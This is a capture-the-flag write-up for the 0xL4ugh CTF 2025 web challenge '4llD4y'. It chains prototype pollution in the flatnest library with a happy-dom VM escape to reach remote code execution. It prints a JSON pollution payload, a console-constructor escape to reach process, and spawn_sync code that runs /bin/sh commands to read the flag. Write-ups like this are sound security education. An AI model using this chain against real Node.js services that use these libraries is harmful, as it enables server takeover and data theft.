# 4llD4y - Web

- CTF: 0xL4ugh CTF 2025
- Category: Web
- Solver: W4ST3D
- Flag: `0xL4ugh{H4appy_D0m_4ll_th3_D4y_e4f982f126da09ce}`

---

## Challenge
> "Stuck in the same day."
>
> The application parses JSON configuration using `flatnest` and renders HTML using `happy-dom`.

---

## Overview
The challenge involves chaining two vulnerabilities: a Prototype Pollution in the `flatnest` library and a VM escape in `happy-dom` to achieve Remote Code Execution (RCE) on the server.

---

## Root Cause
1. **Prototype Pollution in `flatnest` (v1.0.1)**: The library's `seek` function for handling circular references fails to validate the path, allowing `[Circular (__proto__)]` to pollute `Object.prototype`.

2. **RCE via `happy-dom` Gadget**: The `happy-dom` library checks settings on `Object.prototype`. By polluting `settings.enableJavaScriptEvaluation`, we enable script execution in the DOM environment and escape the VM via the exposed `console` object.

---

## Exploitation Steps

### 1. Prototype Pollution via Circular Reference Bypass
The `flatnest` library sanitizes `__proto__` and `constructor` keys but fails to validate paths in its circular reference handler.

```json
{
  "[Circular (__proto__)]": {
    "settings": {
      "enableJavaScriptEvaluation": true,
      "enableJavaScriptProxyRecursion": false
    }
  }
}
```

### 2. VM Escape via Console Object
The challenge creates the window with `new Window({ console })`. The `console` object is from the host Node.js environment:
```javascript
console.log.constructor("return process")()
```

### 3. Synchronous Command Execution
Using `process.binding('spawn_sync')` for synchronous command execution:
```javascript
process.binding('spawn_sync').spawn({
  file: '/bin/sh',
  args: ['/bin/sh', '-c', 'cat /flag*.txt'],
  stdio: [{type:'pipe'}, {type:'pipe'}, {type:'pipe'}]
})
```

### 4. Run the Exploit
```bash
# List files to find flag filename
python3 solve.py "ls /"

# Read the flag
python3 solve.py "cat /flag_657992995b1056ac.txt"
```

---

## Files
- `solve.py`: Automated exploit script
